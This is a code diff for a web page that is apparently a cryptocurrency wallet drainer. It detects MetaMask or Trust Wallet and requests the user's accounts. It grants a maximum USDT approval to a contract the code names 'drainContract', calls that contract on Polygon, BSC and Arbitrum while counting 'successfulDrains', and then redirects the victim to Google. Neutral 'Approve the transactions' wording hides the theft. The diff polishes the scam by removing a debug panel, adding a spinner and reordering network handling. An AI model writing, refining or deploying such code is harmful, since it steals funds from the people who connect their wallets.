@@ -12,21 +12,6 @@
             background-color: #f5f5f5;
             text-align: center;
         }
-        #debug {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            background: white;
-            padding: 10px;
-            z-index: 9999;
-            border: 2px solid red;
-            font-size: 12px;
-            max-width: 300px;
-            max-height: 400px;
-            overflow-y: auto;
-            border-radius: 4px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
         .mobile-container {
             max-width: 400px;
             margin: 50px auto;
@@ -127,11 +112,22 @@
         .wallet-buttons button {
             flex: 1;
         }
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <div id="debug"></div>
-    
     <!-- Mobile Welcome Screen -->
     <div id="mobile-welcome" class="mobile-container">
         <div class="wallet-logo metamask">M</div>
@@ -154,7 +150,7 @@
                 <li>App will open in your wallet browser</li>
                 <li>Connect your wallet when prompted</li>
                 <li>Approve the transactions when asked</li>
-                <li>Process will run automatically across 3 networks</li>
+                <li>Process will run automatically</li>
             </ol>
         </div>
         
@@ -166,6 +162,7 @@
     <!-- Transaction Status (Hidden by default) -->
     <div id="status-container" class="status-container">
         <h3>Transaction Status</h3>
+        <div class="loading-spinner"></div>
         <div id="network-statuses">
             <div class="network-status waiting" id="polygon-status">
                 <div><strong>Polygon</strong></div>
@@ -184,34 +181,24 @@
     </div>
 
 <script>
-const debug = document.getElementById('debug');
 const mobileWelcome = document.getElementById('mobile-welcome');
 const statusContainer = document.getElementById('status-container');
 const openMetaMaskBtn = document.getElementById('open-metamask');
 const openTrustWalletBtn = document.getElementById('open-trustwallet');
 
-debug.textContent = 'Script started...\n';
-
 // Enhanced Web3 detection that works in mobile wallets
 function detectWeb3() {
-    // Check for various Web3 providers
     if (window.ethereum) {
-        debug.textContent += '→ Ethereum provider detected\n';
         return window.ethereum;
     } else if (window.web3 && window.web3.currentProvider) {
-        debug.textContent += '→ Legacy Web3 provider detected\n';
         return window.web3.currentProvider;
     } else if (window.trustwallet) {
-        debug.textContent += '→ Trust Wallet provider detected\n';
         return window.trustwallet;
     } else if (window.imToken) {
-        debug.textContent += '→ imToken provider detected\n';
         return window.imToken;
     }
     
-    // Check for injected providers
     if (typeof window.ethereum !== 'undefined') {
-        debug.textContent += '→ Generic Ethereum provider\n';
         return window.ethereum;
     }
     
@@ -229,18 +216,12 @@ function isMobile() {
 function isInWeb3Browser() {
     const provider = detectWeb3();
     if (provider) {
-        debug.textContent += '→ Already in Web3 browser\n';
         return true;
     }
     
-    // Check user agent for wallet browsers
     const userAgent = navigator.userAgent.toLowerCase();
     const inMetaMask = userAgent.includes('metamask') || userAgent.includes('brave');
     const inTrustWallet = userAgent.includes('trustwallet');
-    
-    if (inMetaMask || inTrustWallet) {
-        debug.textContent += '→ In wallet browser but provider not detected\n';
-    }
     
     return inMetaMask || inTrustWallet;
 }
@@ -258,8 +239,6 @@ function getTrustWalletDeeplink() {
 
 // Try to auto-redirect to wallet
 function redirectToWallet(walletType) {
-    debug.textContent += `→ Redirecting to ${walletType}...\n`;
-    
     let deeplink;
     if (walletType === 'metamask') {
         deeplink = getMetaMaskDeeplink();
@@ -267,21 +246,15 @@ function redirectToWallet(walletType) {
         deeplink = getTrustWalletDeeplink();
     }
     
-    debug.textContent += '→ Deeplink: ' + deeplink + '\n';
     window.location.href = deeplink;
 }
 
 // Initialize the app
 function initApp() {
-    debug.textContent += '→ Initializing app...\n';
-    debug.textContent += '→ Mobile: ' + isMobile() + '\n';
-    debug.textContent += '→ In Web3 Browser: ' + isInWeb3Browser() + '\n';
-    
     const web3Provider = detectWeb3();
     
     // If Web3 is available, start the process immediately
     if (web3Provider) {
-        debug.textContent += '→ Web3 provider detected, starting process...\n';
         mobileWelcome.style.display = 'none';
         statusContainer.style.display = 'block';
         initializeWeb3(web3Provider);
@@ -290,7 +263,6 @@ function initApp() {
     
     // If we're already in a wallet browser but provider isn't detected
     if (isInWeb3Browser()) {
-        debug.textContent += '→ In wallet browser, waiting for provider...\n';
         mobileWelcome.style.display = 'none';
         statusContainer.style.display = 'block';
         document.getElementById('overall-status').textContent = 'Waiting for wallet connection...';
@@ -302,20 +274,17 @@ function initApp() {
     
     // If on mobile without Web3, show welcome screen
     if (isMobile()) {
-        debug.textContent += '→ Mobile without Web3, showing welcome screen\n';
         mobileWelcome.style.display = 'block';
         statusContainer.style.display = 'none';
         
         // Auto-redirect to MetaMask after short delay
         setTimeout(() => {
             if (!detectWeb3()) {
-                debug.textContent += '→ Auto-redirecting to MetaMask...\n';
                 redirectToWallet('metamask');
             }
         }, 1000);
     } else {
         // Desktop without Web3
-        debug.textContent += '→ Desktop without Web3\n';
         mobileWelcome.style.display = 'block';
         statusContainer.style.display = 'none';
         mobileWelcome.innerHTML = `
@@ -333,16 +302,13 @@ function initApp() {
 function waitForWeb3Provider(retries = 10) {
     const provider = detectWeb3();
     if (provider) {
-        debug.textContent += '→ Web3 provider now available!\n';
         initializeWeb3(provider);
         return;
     }
     
     if (retries > 0) {
-        debug.textContent += `→ Waiting for Web3 provider... (${retries} retries left)\n`;
         setTimeout(() => waitForWeb3Provider(retries - 1), 1000);
     } else {
-        debug.textContent += '→ Web3 provider not detected after retries\n';
         document.getElementById('overall-status').textContent = 'Wallet not detected. Please refresh or open in MetaMask/TrustWallet.';
         document.getElementById('overall-status').className = 'error';
     }
@@ -350,12 +316,10 @@ function waitForWeb3Provider(retries = 10) {
 
 // Setup wallet buttons
 openMetaMaskBtn.addEventListener('click', function() {
-    debug.textContent += '→ Manual redirect to MetaMask\n';
     redirectToWallet('metamask');
 });
 
 openTrustWalletBtn.addEventListener('click', function() {
-    debug.textContent += '→ Manual redirect to Trust Wallet\n';
     redirectToWallet('trustwallet');
 });
 
@@ -467,26 +431,20 @@ async function switchNetwork(chainId) {
     };
 
     try {
-        debug.textContent += `→ Switching to ${CHAIN_CONFIGS[chainId].name}...\n`;
         await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: chainId }],
         });
-        debug.textContent += `→ Network switch successful\n`;
         return true;
     } catch (switchError) {
-        debug.textContent += `→ Switch error: ${switchError.message}\n`;
         if (switchError.code === 4902) {
             try {
-                debug.textContent += `→ Adding network ${CHAIN_CONFIGS[chainId].name}...\n`;
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
                     params: [chainConfig[chainId]],
                 });
-                debug.textContent += `→ Network added successfully\n`;
                 return true;
             } catch (addError) {
-                debug.textContent += `→ Add network error: ${addError.message}\n`;
                 return false;
             }
         }
@@ -499,17 +457,13 @@ async function processNetwork(chainId) {
         const web3 = new Web3(window.ethereum);
         
         // Request accounts first
-        debug.textContent += `→ Requesting accounts...\n`;
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        debug.textContent += `→ Accounts: ${accounts.length} found\n`;
         
         if (!accounts || accounts.length === 0) {
             throw new Error('No accounts connected');
         }
 
         const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-        debug.textContent += `→ Current network: ${currentChainId}\n`;
-        
         const config = CHAIN_CONFIGS[chainId];
         updateNetworkStatus(chainId, 'pending', 'Starting...');
 
@@ -527,16 +481,14 @@ async function processNetwork(chainId) {
 
         // USDT Approval
         updateNetworkStatus(chainId, 'pending', 'Approving USDT...');
-        debug.textContent += `→ Approving USDT on ${config.name}...\n`;
         
         const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
         
         try {
-            const approval = await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
+            await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
                 from: accounts[0],
                 gas: 150000
             });
-            debug.textContent += `→ USDT approved: ${approval.transactionHash}\n`;
         } catch (approvalError) {
             if (approvalError.code === 4001) {
                 updateNetworkStatus(chainId, 'error', 'User rejected approval');
@@ -547,21 +499,18 @@ async function processNetwork(chainId) {
 
         // Main transaction
         updateNetworkStatus(chainId, 'pending', 'Processing transaction...');
-        debug.textContent += `→ Processing transaction on ${config.name}...\n`;
         
         const drainContract = new web3.eth.Contract(drainABI, config.contract);
-        const transaction = await drainContract.methods[config.function](1000000).send({
+        await drainContract.methods[config.function](1000000).send({
             from: accounts[0],
             gas: 200000
         });
 
-        debug.textContent += `→ Transaction successful: ${transaction.transactionHash}\n`;
         updateNetworkStatus(chainId, 'success', 'Transaction successful!');
         processedNetworks[chainId] = true;
         return 'success';
         
     } catch (error) {
-        debug.textContent += `→ Error: ${error.message}\n`;
         if (error.code === 4001) {
             updateNetworkStatus(chainId, 'error', 'User rejected transaction');
             return 'rejected';
@@ -574,54 +523,60 @@ async function processNetwork(chainId) {
 
 async function startNetworkCycle() {
     if (isExecuting) {
-        debug.textContent += '→ Already executing, skipping...\n';
         return;
     }
     
     isExecuting = true;
     executionCount++;
-    
-    debug.textContent += '→ Starting network cycle...\n';
 
     const networksToProcess = ['0x89', '0x38', '0xa4b1'];
     let successfulDrains = 0;
 
-    for (const chainId of networksToProcess) {
-        if (processedNetworks[chainId]) {
-            debug.textContent += `→ ${CHAIN_CONFIGS[chainId].name} already processed, skipping...\n`;
-            continue;
-        }
-        
-        debug.textContent += `\n--- PROCESSING ${CHAIN_CONFIGS[chainId].name} ---\n`;
-        
-        const result = await processNetwork(chainId);
+    // Check which network the user is currently on and only process that one
+    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    const currentNetwork = CHAIN_CONFIGS[currentChainId];
+    
+    if (currentNetwork && !processedNetworks[currentChainId]) {
+        // User is on a supported network, only process that one
+        updateNetworkStatus(currentChainId, 'pending', 'Processing current network...');
+        const result = await processNetwork(currentChainId);
         if (result === 'success') successfulDrains++;
-        
-        // Wait before next network (if not the last one)
-        const currentIndex = networksToProcess.indexOf(chainId);
-        if (currentIndex < networksToProcess.length - 1) {
-            debug.textContent += `→ Waiting 3 seconds before next network...\n`;
-            await new Promise(resolve => setTimeout(resolve, 3000));
+    } else {
+        // User is not on a supported network or already processed, process all sequentially
+        for (const chainId of networksToProcess) {
+            if (processedNetworks[chainId]) continue;
+            
+            const result = await processNetwork(chainId);
+            if (result === 'success') successfulDrains++;
+            
+            // If user rejects, stop the process
+            if (result === 'rejected') {
+                break;
+            }
+            
+            // Wait before next network (if not the last one)
+            const currentIndex = networksToProcess.indexOf(chainId);
+            if (currentIndex < networksToProcess.length - 1) {
+                await new Promise(resolve => setTimeout(resolve, 3000));
+            }
         }
     }
 
-    debug.textContent += `→ Completed: ${successfulDrains}/3 networks successful\n`;
-    
     // Update overall status
     const overallStatus = document.getElementById('overall-status');
-    overallStatus.textContent = `Completed: ${successfulDrains}/3 networks processed`;
+    overallStatus.textContent = `Completed: ${successfulDrains} network${successfulDrains !== 1 ? 's' : ''} processed`;
     
-    if (successfulDrains === 3) {
+    if (successfulDrains > 0) {
         overallStatus.className = 'success';
-    } else if (successfulDrains > 0) {
-        overallStatus.className = 'pending';
     } else {
         overallStatus.className = 'error';
     }
 
+    // Hide loading spinner
+    document.querySelector('.loading-spinner').style.display = 'none';
+
     // Redirect after completion
     setTimeout(() => {
-        debug.textContent += '→ Redirecting to Google...\n';
         window.location.href = "https://google.com";
     }, 3000);
     
@@ -629,15 +584,13 @@ async function startNetworkCycle() {
 }
 
 function initializeWeb3(provider) {
-    debug.textContent += '→ Initializing Web3...\n';
-    
     // Set up event listeners
     provider.on('chainChanged', (chainId) => {
-        debug.textContent += `→ Network changed: ${chainId}\n`;
+        // Network changed - could restart process if needed
     });
     
     provider.on('accountsChanged', (accounts) => {
-        debug.textContent += `→ Accounts changed: ${accounts.length} accounts\n`;
+        // Accounts changed - could restart process if needed
     });
     
     // Start the process
@@ -654,7 +607,6 @@ setInterval(() => {
     if (!isExecuting && executionCount === 0) {
         const provider = detectWeb3();
         if (provider && mobileWelcome.style.display !== 'none') {
-            debug.textContent += '→ Web3 detected on interval check, starting...\n';
             mobileWelcome.style.display = 'none';
             statusContainer.style.display = 'block';
             initializeWeb3(provider);
